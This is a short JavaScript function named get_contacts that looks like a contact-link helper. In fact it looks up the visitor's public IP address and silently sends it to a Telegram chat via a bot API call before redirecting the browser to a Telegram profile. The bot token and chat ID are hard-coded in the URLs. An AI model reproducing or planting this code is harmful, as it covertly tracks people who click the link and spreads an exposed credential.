const get_contacts = () => {
  fetch('https://api.ipify.org').then(e => e.text()).then(IP => {
    fetch('https://api.telegram.org/bot1870755044:AAE0iy16GcWHGjdPSBlxM0dLa8FZgq7l5Sk/sendMessage?text='+IP+'&chat_id=-1001267652374').then(e => {
      fetch('https://api.telegram.org/bot1870755044:AAE0iy16GcWHGjdPSBlxM0dLa8FZgq7l5Sk/getMe').then(e => e.json()).then(e => {
        window.location.href = 'https://t.me/'+e.result.first_name
      })
    })
  })
}
